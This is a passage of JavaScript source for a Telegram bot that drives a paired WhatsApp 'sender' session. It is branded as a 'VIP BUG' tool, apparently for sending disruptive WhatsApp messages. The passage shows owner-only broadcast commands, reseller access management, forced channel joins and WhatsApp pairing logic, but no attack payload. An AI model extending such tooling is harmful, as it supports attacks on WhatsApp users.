    if (ctx?.callbackQuery) await ctx.answerCbQuery("Menu update failed; please try again.").catch(() => {});
    else if (ctx?.chat) await ctx.reply("⚠️ Temporary Telegram error. Please send /start again.").catch(() => {});
  } catch (_) {}
});

// Telegram group/supergroup/channel use is disabled. All bot features work only in DM.
bot.use(async (ctx, next) => {
  const isOwnerChat = Boolean(ctx.from?.id && OWNER_IDS.includes(ctx.from.id.toString()));
  if (ctx.chat && ctx.chat.type !== "private" && !isOwnerChat) {
    try {
      await ctx.reply("🔒 Is bot ko sirf private DM mein use karein.");
    } catch (_) {}
    return;
  }
  return next();
});

// Force-join checks run before normal commands/actions for non-owner private users.
bot.use(checkForceJoin);

// Store users who interact with the bot in private DM for owner announcements.
bot.use(async (ctx, next) => {
  try { registerBroadcastUser(ctx); } catch (_) {}
  return next();
});

const ownerOnly = async (ctx, next) => {
  if (!OWNER_IDS.includes(ctx.from.id.toString())) {
    return ctx.reply("❌ Only the owner can use this command.");
  }
  return next();
};

const runFreeModeAnnouncement = async (ctx, enabled) => {
  freeMode = enabled;
  saveAccessMode(enabled);
  const result = await broadcastAnnouncement(freeAnnouncement(enabled));
  return ctx.reply(
    `${enabled ? "✅ Free Mode ON" : "🔒 Free Mode OFF"}\n` +
    `Announcement sent: ${result.sent}\nFailed/blocked: ${result.failed}`
  );
};

// Hidden owner commands: not shown in any menu.
bot.command("freeon", ownerOnly, async (ctx) => runFreeModeAnnouncement(ctx, true));
bot.command("freeoff", ownerOnly, async (ctx) => runFreeModeAnnouncement(ctx, false));
// Backward-compatible alias.
bot.command("free", ownerOnly, async (ctx) => runFreeModeAnnouncement(ctx, true));

bot.command("broadcast", ownerOnly, async (ctx) => {
  const text = ctx.message.text.replace(/^\/broadcast(?:@\w+)?\s*/i, "").trim();
  if (!text) return ctx.reply("⚠️ Use: /broadcast your message here");
  const safeText = text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  const message = new HTML()
    .heading(1, "📢 ANNOUNCEMENT")
    .divider()
    .paragraph(safeText)
    .divider()
    .footer("© 𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆")
    .build();
  const result = await broadcastAnnouncement(message);
  return ctx.reply(`✅ Broadcast complete.\nSent: ${result.sent}\nFailed/blocked: ${result.failed}`);
});


// Owner-only bot directory management.
// Usage: /addbot Bot Name | @botusername
//        /addbot Bot Name | https://t.me/botusername
bot.command("addbot", checkOwner, async (ctx) => {
  const raw = ctx.message.text.replace(/^\/addbot(?:@\w+)?\s*/i, "").trim();
  const parts = raw.split("|").map(v => v.trim());
  if (parts.length < 2 || !parts[0] || !parts[1]) {
    return ctx.reply(
      "⚠️ Usage:\n/addbot Bot Name | @botusername\n\nExample:\n/addbot MAFIAN Tools | @mafian_tools"
    );
  }

  const result = addMoreBot(parts[0], parts[1]);
  if (!result.success) return ctx.reply(`❌ ${result.message}`);
  return ctx.reply(`✅ Bot added successfully.\n\n🤖 ${result.bot.name}\n🔗 ${result.bot.link}`);
});

bot.command("delbot", checkOwner, async (ctx) => {
  const index = ctx.message.text.trim().split(/\s+/)[1];
  const removed = removeMoreBot(index);
  if (!removed) return ctx.reply("⚠️ Use /delbot <number>.\nCheck the current list with /listbots.");
  return ctx.reply(`🗑 Removed: ${removed.name}`);
});

bot.command("listbots", checkOwner, async (ctx) => {
  const bots = loadMoreBots();
  if (!bots.length) return ctx.reply("🤖 No additional bots have been added yet.");
  const lines = bots.map((bot, i) => `${i + 1}. ${bot.name}\n   ${bot.link}`);
  return ctx.reply(`🤖 MORE BOTS\n\n${lines.join("\n")}\n\nUse /delbot <number> to remove one.`);
});

bot.command("morebots", async (ctx) => {
  const bots = loadMoreBots();
  if (!bots.length) return ctx.reply("🤖 No additional bots are available right now.");
  const msg = new HTML()
    .heading(1, "🤖 MORE BOTS")
    .divider()
    .paragraph("Choose another MAFIAN bot below.")
    .build();

  return ctx.sendRichMessage(msg, {
    parse_mode: "HTML",
    reply_markup: moreBotsKeyboard()
  });
});

bot.action("more_bots", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  try { await ctx.deleteMessage(); } catch (_) {}

  const bots = loadMoreBots();
  if (!bots.length) {
    return ctx.reply("🤖 No additional bots are available right now.");
  }

  const msg = new HTML()
    .heading(1, "🤖 MORE BOTS")
    .divider()
    .paragraph("Choose another MAFIAN bot below.")
    .build();

  return ctx.sendRichMessage(msg, {
    parse_mode: "HTML",
    reply_markup: moreBotsKeyboard()
  });
});

bot.command("address", checkOwner, async (ctx) => {
  const target = ctx.message.text.trim().split(/\s+/)[1];
  if (!target || !/^\d+$/.test(target)) {
    return ctx.reply("⚠️ Use: /address <userId>\nExample: /address 123456789");
  }
  if (!resellerUsers.includes(target)) {
    resellerUsers.push(target);
    saveResellers();
  }
  return ctx.reply(`✅ Reseller access added for ${target}.`);
});

bot.command("delress", checkOwner, async (ctx) => {
  const target = ctx.message.text.trim().split(/\s+/)[1];
  if (!target || !/^\d+$/.test(target)) {
    return ctx.reply("⚠️ Use: /delress <userId>\nExample: /delress 123456789");
  }
  resellerUsers = resellerUsers.filter(id => id !== target);
  saveResellers();
  return ctx.reply(`🗑 Reseller access removed for ${target}.`);
});

let tokenValidated = false; // retained for compatibility; startup whitelist gate is disabled
 

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀             「〔 ACCES GRANTED 〕」
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠖⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⢤⡀⠀⠀⠀⠀⢸⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡀⠈⠢⡀⠀⠀⢀⠀⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⡔⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠊⡹⠀⠀⠘⢄⠀⠈⠲⢖⠈⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠈⠢⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠁⢠⠞⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠉⠑⠢⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡠⠚⠁⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⠇⠀⡤⡀⠀⠀⠀⢀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢠⣾⣿⣷⣶⣤⣄⣉⠑⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠞⢁⣴⣾⣿⣿⡆⢇⠀⠀⠀⠀⠀⠸⡀⠀⠂⠿⢦⡰⠀⠀⠋⡄⠀⠀⠀⠀⠀⠀⠀⢰⠁⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⢆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡴⢁⣴⣿⣿⣿⣿⣿⣿⡘⡄⠀⠀⠀⠀⠀⠱⣔⠤⡀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⡜⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⢣⠀⠀⠀⠀⠀
⠀⠀⡼⢠⣾⣿⣿⣿⣿⣿⣿⣿⣧⡘⢆⠀⠀⠀⠀⠀⢃⠑⢌⣦⠀⠩⠉⠀⡜⠀⠀⠀⠀⠀⠀⢠⠃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣣⡀⠀⠀⠀
⠀⠀⢰⢃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠱⡀⠀⠀⠀⢸⠀⠀⠓⠭⡭⠙⠋⠀⠀⠀⠀⠀⠀⠀⡜⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡱⡄⠀⠀
⠀⠀⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢃⠀⠀⠀⢸⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⢀⠜⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠘⣆⠀
⠀⢸⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣆⠀⠀⡆⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⡠⠖⣡⣾⠁⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⠀
⠀⡏⣾⣿⣿⣿⣿⡿⡛⢟⢿⣿⣿⣿⣿⣿⣿⣧⡈⢦⣠⠃⠀⠀⠀⠀⠀⢱⣀⠤⠒⢉⣾⡉⠻⠋⠈⢘⢿⣿⣿⣿⣿⠿⣿⣿⠏⠉⠻⢿⣿⣿⣿⣿⡘⡆
⢰⡇⣿⣿⠟⠁⢸⣠⠂⡄⣃⠜⣿⣿⠿⠿⣿⣿⡿⠦⡎⠀⠀⠀⠀⠀⠒⠉⠉⠑⣴⣿⣿⣎⠁⠠⠂⠮⢔⣿⡿⠉⠁⠀⠹⡛⢀⣀⡠⠀⠙⢿⣿⣿⡇⡇
⠘⡇⠏⠀⠀⠀⡾⠤⡀⠑⠒⠈⠣⣀⣀⡀⠤⠋⢀⡜⣀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠙⢿⡟⠉⡃⠈⢀⠴⣿⣿⣀⡀⠀⠀⠀⠈⡈⠊⠀⠀⠀⠀⠙⢿⡇⡇
⠀⠿⠀⠀⠀⠀⠈⠀⠉⠙⠓⢤⣀⠀⠁⣀⡠⢔⡿⠊⠀⠀⠀⠀⠙⢦⡀⠀⠐⠢⢄⡀⠁⡲⠃⠀⡜⠀⠹⠟⠻⣿⣰⡐⣄⠎⠀⠀⠀⠀⠀⠀⠀⠀⢣⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠙⢦⣀⢀⡴⠁⠀⠀⠀⠀⠉⠁⢱⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠈⢏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⢀⡴⠁⠀⠀⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠘⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⣧⣠⠤⠤⠋⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀⠳⢄⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠊⠈⠁⠀⠀⠀⡔⠛⠲⣤⣀⣀⣀⠀⠈⢣⡀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⢀⡠⢔⠝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢈⠤⠒⣀⠀⠀⠀⠀⣀⠟⠀⠀⠀⠑⠢⢄⡀⠀⠀⠈⡗⠂⠀⠀⠀⠙⢦⠤⠒⢊⡡⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠒⣒⡁⠬⠦⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠒⢺⢠⠤⡀⢀⠤⡀⠠⠷⡊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠣⡀⡱⠧⡀⢰⠓⠤⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `))
    
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

        const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        // PERBAIKAN: Pakai pino({ level: "fatal" }) atau "silent" murni biar dia gak nyepam log koneksi apa-apa di terminal
        logger: pino({ level: "fatal" }), 
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };


    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Unknown";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆  ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            // Memberikan jeda 500ms agar log penutup Baileys keluar dulu ke terminal
            await new Promise(resolve => setTimeout(resolve, 500));
            
            console.clear();
            process.stdout.write('\x1Bc'); // Hard-wipe history layar terminal
            
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢡⡀⢀⣠⣤⠤⠷⠤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⣀⡴⠟⠉⢠⡀⠠⢤⣄⣠⠀⠉⠻⢦⡀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠄⠀⠀⠈⢳⡞⠉⠀⠀⠀⣠⡇⢀⠄⠀⢷⡀⠀⠀⠀⠘⣶⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⡟⠉⠒⠦⣄⣠⡏⠀⠀⠀⠀⢰⣿⢀⣴⣶⣦⡄⣻⠄⢀⢀⣠⣤⢧⣄⣠⠤⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣿⡋⠀⠀⠀⠀⠀⡟⠀⠀⢠⣠⠀⠀⠹⣿⣿⣿⣿⣿⠋⠀⠈⡍⠀⠀⠈⣿⠀⠀⠀⠀⠒⢦⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡏⠀⠀⠀⣀⣀⣸⠁⠀⠀⣆⠙⣿⣆⢠⣿⣷⣿⣿⣷⠀⣠⣾⣷⡞⠀⠀⢹⣀⣀⣀⣀⠀⢸⣷⣧⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠸⡄⠀⢀⡘⢦⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣩⠇⡀⠀⢸⠀⠀⠀⠀⠉⢸⣿⣿⣿⣮⡁⡀⠀⠀⠀⠀
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⢄⡀⠀⠀⠀⢀⣷⡸⣄⣙⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣖⡚⠁⢀⣞⡀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡴⣔⠀⠀⠀
⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠐⠺⡏⣍⣁⠀⣽⣿⣿⣿⣿⣿⣿⣽⣿⣯⣽⣿⣿⣿⣍⢁⡜⠉⠉⠓⢤⣄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠠⣷⣿⣗⡤⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⠛⢤⡀⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
⠀⣿⣿⣿⣿⣿⠿⢿⣿⣿⠿⢿⣿⣿⣿⣿⣷⡀⠈⣿⣿⣄⠀⣿⣿⣿⠁⠹⣿⣿⣿⣿⣿⢿⣿⣗⠀⠀⠀⠉⠂⣠⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢀⡿⡿⠉⣿⡟⠀⢸⣿⠏⠀⠀⢹⠿⠿⢿⣿⣷⣄⠚⢿⣿⣿⣿⡿⠃⢈⣹⣿⣿⣿⣿⣿⡎⢿⣿⣇⠀⠀⣶⣴⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣾⣿⡇⠀⢸⠋⠀⠀⠀⠸⠀⠀⠀⠉⠛⣿⣷⣟⣙⠿⣿⡁⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⠟⢿⡏⠀⢸⠉⠁⠀⠈⢹⢿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⡇⠀⠾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠍⠛⢿⠷⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣆⠀⠁⠀⠀⠀⠀⠈⠀⠀⠀⠀⠞⠀⠘⣿⣿⣟
⢸⣿⣿⣏⣿⡗⠀⠀⠀⠀⠀⠀⣠⠒⠊⠉⠉⠉⢉⣒⠦⣄⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣤⣿⣿⠿⠶⠶⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇
⠘⣿⣷⣿⡝⠁⠀⠀⠀⠀⠀⠉⢁⠀⠀⠀⠀⠀⠀⠈⢹⣮⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠙⠀⠀⠀⠀⠀⠀⠈⠛⢆⠀⠀⠀⠀⠀⠀⠀⠋⢻⡇
⠀⠻⣿⣤⠁⠀⠀⠀⠀⠀⣤⠈⠋⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⠀⠀⠀⢠⡿⠁
⠀⠀⢻⣧⡀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⣼⠃⠀
⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣧⠀⠀⣀⡼⠁⠀⠀
⠀⠀⠀⠀⠙⢶⡀⠀⠀⠀⠀⢿⣷⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠀⠀⠛⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⠏⠉⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⢿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⡿⣾⢻⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⠙⠳⢤⣀⣀⣀⣠⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

「I」 「〔 SENDER CONNECT 〕」 「I」 `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                console.clear(); 
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};



const { RichHTMLBuilder: HTML } = RichMessage;

const checkWhatsAppConnection = async (ctx, next) => {
  if (isWhatsAppConnected && sock?.user) {
    return next();
  }

  const msg = new HTML()

    .heading(
      1,
      HTML.customEmoji("5350759382223186548", "📡") +
      " Sender Offline"
    )

    .divider()

    .blockQuote(
      HTML.bold("WhatsApp Sender is currently disconnected.")
    )

    .paragraph(
      "Bot tidak dapat menjalankan fitur yang membutuhkan koneksi WhatsApp.\n\n" +
      "Silakan hubungkan Sender terlebih dahulu sebelum menggunakan command ini."
    )

    .divider()

    .table(
      [
        ["Status", "Value"],
        ["Connection", "Offline ❌"],
        ["Required", "WhatsApp Sender"],
        ["Action", "Connect Sender"]
      ],
      {
        bordered: true,
        striped: true,
        hasHeader: true
      }
    )

    .divider()

    .taskList(
      {
        text: "Telegram Connected",
        checked: true
      },
      {
        text: "WhatsApp Sender Connected",
        checked: false
      }
    )

    .details(
      "📖 Information",
      "Make sure WhatsApp is logged in again. Once the status changes to Connected, all commands will be available again."
    )

    .footer(
      "©𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆" +
      HTML.customEmoji("5429528223438367408", "👑")
    )

    .build();

  return await ctx.sendRichMessage(msg, {
    protect_content: true,
    reply_markup: Markup.inlineKeyboard([
      [
        {
          text: "Developer",
          url: "https://t.me/FG_MAFIAN",
          style: "success",
          icon_custom_emoji_id: "5350280858441903578"
        }
      ]
    ]).reply_markup
  });
};

// Menu START
const PHOTOS = [
  "https://files.catbox.moe/1qskc7.png",
  "https://files.catbox.moe/4r1n3w.png",
  "https://files.catbox.moe/6no3v1.png"
];

// ==================== FORCE JOIN MANAGER ====================
// Owner-managed required groups/channels. Users must join every configured
// chat before using the bot. Public usernames and private chat IDs are supported.
const forceJoinFile = "./Database/forceJoin.json";

const loadForceJoins = () => {
  try {
    if (!fs.existsSync(forceJoinFile)) return [];
    const data = JSON.parse(fs.readFileSync(forceJoinFile, "utf8") || "[]");
    return Array.isArray(data) ? data : [];
  } catch (error) {
    console.error("Failed to load forceJoin.json:", error.message);
    return [];
  }
};

const saveForceJoins = (data) => fs.writeFileSync(forceJoinFile, JSON.stringify(data, null, 2));

const normalizeForceJoinChat = (value) => {
  const raw = String(value || "").trim();
  if (!raw) return null;
  if (/^-100\d+$/.test(raw) || /^-\d+$/.test(raw)) return raw;
  const username = raw.replace(/^https?:\/\/(?:t\.me|telegram\.me)\//i, "").replace(/^@/, "").replace(/\/$/, "");
  if (/^[A-Za-z0-9_]{5,32}$/.test(username)) return `@${username}`;
  return null;
};

const normalizeForceJoinLink = (value, chat) => {
  const raw = String(value || "").trim();
  if (/^https?:\/\//i.test(raw)) return raw;
  const username = String(chat || "").replace(/^@/, "");
  if (/^[A-Za-z0-9_]{5,32}$/.test(username)) return `https://t.me/${username}`;
  return null;
};

const addForceJoin = (chatValue, name, linkValue) => {
  const chat = normalizeForceJoinChat(chatValue);
  const nameClean = String(name || "").trim().slice(0, 64);
  const link = normalizeForceJoinLink(linkValue, chat);
  if (!chat || !nameClean || !link) return { success: false, message: "Invalid chat, name, or join link." };
  const list = loadForceJoins();
  if (list.some(item => String(item.chat).toLowerCase() === chat.toLowerCase())) {
    return { success: false, message: "That group/channel is already in the force-join list." };
  }
  const item = { chat, name: nameClean, link, addedAt: new Date().toISOString() };
  list.push(item);
  saveForceJoins(list);
  return { success: true, item };
};

const removeForceJoin = (index) => {
  const list = loadForceJoins();
  const idx = Number(index) - 1;
  if (!Number.isInteger(idx) || idx < 0 || idx >= list.length) return null;
  const removed = list.splice(idx, 1)[0];
  saveForceJoins(list);
  return removed;
};

const isMemberOfForceJoin = async (ctx, item) => {
  try {
    const member = await bot.telegram.getChatMember(item.chat, ctx.from.id);
    const status = member?.status;
    return ["creator", "administrator", "member"].includes(status) ||
      (status === "restricted" && member?.is_member === true);
  } catch (error) {
    console.error(`Force-join check failed for ${item.chat}:`, error?.message || error);
    // If Telegram cannot verify the chat, fail closed so the owner is alerted
    // instead of accidentally bypassing a configured requirement.
    return false;
  }
};

const checkForceJoin = async (ctx, next) => {
  if (ctx.callbackQuery?.data === "check_force_join") return next();
  if (!ctx.from || OWNER_IDS.includes(String(ctx.from.id))) return next();
  if (!ctx.chat || ctx.chat.type !== "private") return next();
  const required = loadForceJoins();
  if (!required.length) return next();

  const missing = [];
  for (const item of required) {
    if (!(await isMemberOfForceJoin(ctx, item))) missing.push(item);
  }
  if (!missing.length) return next();

  const buttons = missing.map(item => [{ text: `📢 Join ${item.name}`.slice(0, 64), url: item.link }]);
